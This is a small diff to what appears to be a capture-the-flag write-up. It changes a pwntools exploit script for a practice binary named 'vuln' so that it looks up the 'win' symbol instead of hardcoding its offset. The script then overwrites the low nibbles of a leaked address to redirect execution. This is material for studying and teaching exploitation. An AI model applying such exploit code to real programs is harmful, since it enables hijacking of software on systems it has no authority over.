@@ -229,6 +229,7 @@ Breakpoint 1, 0x00005555555552ee in call_functions ()
 from pwn import *
 
 binary = './vuln'
+elf = ELF(binary)
 
 context.binary = binary
 
@@ -244,7 +245,7 @@ addr_str = p.readline().decode().strip()
 addr = list(addr_str)
 # print("response addr:",addr, addr_str)
 
-win_offset = ['1','3','6','a']
+win_offset = hex(elf.symbols['win'])
 
 for i in range(-3, 0):
     addr[i] = win_offset[i]
@@ -257,6 +258,7 @@ p.sendline(payload)
 
 remaining_text = p.recv()
 print(remaining_text.decode())
+
 ```
 
 ## References:
